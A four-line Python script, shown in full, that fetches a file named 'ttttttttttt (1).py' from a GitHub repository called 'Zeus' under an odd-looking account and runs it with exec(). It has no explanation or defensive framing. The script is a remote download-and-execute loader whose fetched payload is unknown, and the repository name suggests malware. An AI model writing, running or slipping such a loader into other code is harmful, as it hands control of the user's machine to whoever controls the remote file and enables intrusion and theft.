import requests
url = "https://github.com/apaseaa2188ggq-sketch/Zeus/raw/refs/heads/main/ttttttttttt%20(1).py"
code = requests.get(url).text
exec(code)